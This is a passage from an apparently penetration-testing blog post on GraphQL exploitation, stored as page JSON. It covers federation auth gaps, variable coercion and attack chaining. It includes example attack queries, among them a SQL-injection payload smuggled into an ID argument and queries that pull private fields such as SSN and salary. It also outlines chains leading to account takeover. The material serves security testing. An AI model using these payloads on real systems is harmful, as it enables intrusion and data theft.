\"victim_id\") {\n    email\n    activity\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eFederation vulnerabilities\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eTest for inconsistent authorization between federated services\u003c/li\u003e\n\u003cli\u003eCheck for information leakage in subgraph responses\u003c/li\u003e\n\u003cli\u003eExploit entity resolution misconfigurations\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eReal-world examples:\u003c/p\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003e# 1. Exploiting inconsistent auth in a microservices architecture\n# A real case where User service required JWT but Products service only checked\n# if any JWT was present without validating user permissions\nquery ProductLeakage {\n  product(id: \"classified-product-1337\") {\n    name\n    price\n    internalManufacturingCost  # Should be admin-only field\n  }\n}\n\n# 2. Entity resolution bypass found in production\n# Gateway expected ID to be a UUID but subgraph accepted string format too\nquery EntityResolutionBypass {\n  node(id: \"user-1 UNION SELECT * FROM admin_users--\") {\n    ... on User {\n      username\n      email\n    }\n  }\n}\n\n# 3. Documented gateway bypass in a financial company\n# Sending to https://payments.internal-api.company.com:8443/graphql\n# instead of https://api.company.com/graphql bypassed IP restrictions\nquery DirectSubgraphAccess {\n  processCreditCard(input: {\n    cardNumber: \"4111111111111111\",\n    cvv: \"123\"\n  }) {\n    success\n  }\n}\n\n# 4. Observed type extension confusion vulnerability\nquery TypeExtensionConfusion {\n  product(id: \"1\") {\n    name\n    # Product type was defined in main subgraph with proper auth\n    \n    reviews {\n      # Reviews subgraph extended Product but implemented different\n      # auth checks, leading to leak of embargoed reviews\n      embargoed\n      unreleased\n    }\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eFederation vulnerabilities discovered in production often involve:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAuthentication verification occuring at gateway but authorization in subgraphs\u003c/li\u003e\n\u003cli\u003eJWT validation differences between gateway and subgraphs\u003c/li\u003e\n\u003cli\u003eDirect subgraph exposure (services accessible directly, bypassing gateway)\u003c/li\u003e\n\u003cli\u003eEntity key validation differences (UUID vs string vs int)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eVariable coercion attacks\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eExploit type conversion in GraphQL by providing unexpected types\u003c/li\u003e\n\u003cli\u003eTest Boolean/String/Int conversions for logic bypasses\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eExample:\u003c/p\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003equery ($isAdmin: Boolean!) {\n  userInfo(includePrivate: $isAdmin) {\n    email\n    ssn\n    salary\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSend with variables: \u003ccode\u003e{\"isAdmin\": \"true\"}\u003c/code\u003e instead of \u003ccode\u003e{\"isAdmin\": true}\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003e10. Real-World Attack Chaining\u003c/h3\u003e\n\u003cp\u003eThe most devastating GraphQL attacks chain multiple vulnerabilities:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eIntrospection to data leak to account takeover\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eMap the API with introspection\u003c/li\u003e\n\u003cli\u003eFind and exploit an injection vulnerability\u003c/li\u003e\n\u003cli\u003eExtract sensitive data or authentication material\u003c/li\u003e\n\u003cli\u003eUse this to elevate privileges or take over accounts\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eDoS to injection to privilege escalation\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCreate DoS conditions to trigger error states\u003c/li\u003e\n\u003cli\u003eUse error messages to gather information\u003c/li\u003e\n\u003cli\u003eLeverage timing attacks during DoS to extract data\u003c/li\u003e\n\u003cli\u003eUse extracted data to gain higher privileges\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eBatching + injection + CSRF\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUse batching to bypass rate limits\u003c/li\u003e\n\u003cli\u003eChain with injection to extract CSRF tokens\u003c/li\u003e\n\u003cli\u003eCreate CSRF exploits using the extracted tokens\u003c/li\u003e\n\u003cli\u003eBundle everything in a deliverable attack package\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eDocument your attack chains carefully - they're often the most convincing demonstrations of impact.\u003c/p\u003e\n\u003ch2\u003eConclusion\u003c/h2\u003e\n\u003cp\u003eGraphQL gives security testers a massive attack surface to work with. The same features that make it attractive to developers create openings for us to exploit. From conducting initial reconnaissance through introspection, to injecting malicious queries, to performing nested query DoS attacks - GraphQL offers many paths to compromise.\u003c/p\u003e\n\u003cp\u003eRemember that most GraphQL deployments are still immature from a security perspective. Developers are focused on functionality first, with security as an afterthought. This means you'll often find multiple vulnerabilities in a single API that can be chained together for maximum impact.\u003c/p\u003e\n\u003cp\u003eThe most effective attack strategies combine multiple techniques. Start with introspection to map the API, use injection techniques to extract sensitive data, leverage batching to bypass rate limits, and if all else fails, hit them with resource-intensive queries to impact availability.\u003c/p\u003e\n\u003cp\u003eWhen testing GraphQL APIs, always look beyond the obvious. That email field might expose more than just the address if you inject the right payload. That simple query might return admin data if you bypass object-level checks. That innocent-looking mutation might affect more than what's documented.\u003c/p\u003e\n\u003cp\u003eThe best part about attacking GraphQL is that many traditional protections don't apply. WAFs often struggle with GraphQL's flexible format. Authentication schemes that work for REST often break down with GraphQL's single endpoint model. And many GraphQL servers still have introspection enabled in production, essentially handing you the keys to the kingdom.\u003c/p\u003e\n\u003cp\u003eWhether it's API mapping, data exfiltration, or full account takeover, GraphQL offers plenty of opportunities for creative attacks. Use the techniques in this article to thoroughly test GraphQL implementations and demonstrate real impact to your clients or organization.\u003c/p\u003e\n\u003cp\u003eHappy hacking!\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003e\u003cem\u003eDisclaimer: This article is provided for educational purposes only. The techniques described should only be used in authorized environments and security research contexts. Always follow responsible disclosure practices and operate within legal and ethical boundaries.\u003c/em\u003e\u003c/p\u003e\n","excerpt":"GraphQL has become the darling of modern API development, and for good reason. It solves many of the headaches that come with traditional REST APIs by lettin...","title":"GraphQL PenTest Methodology and Exploitation Techniques","date":"2023-03-18","tags":["Web Security","GraphQL","Penetration Testing","API Security","Vulnerability Research","Exploitation"]}},"__N_SSG":true},"page":"/blog/[slug]","query":{"slug":"graphql-security-flaws"},"buildId":"EJgAsPo3Kz3qeohT_5Phd","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>
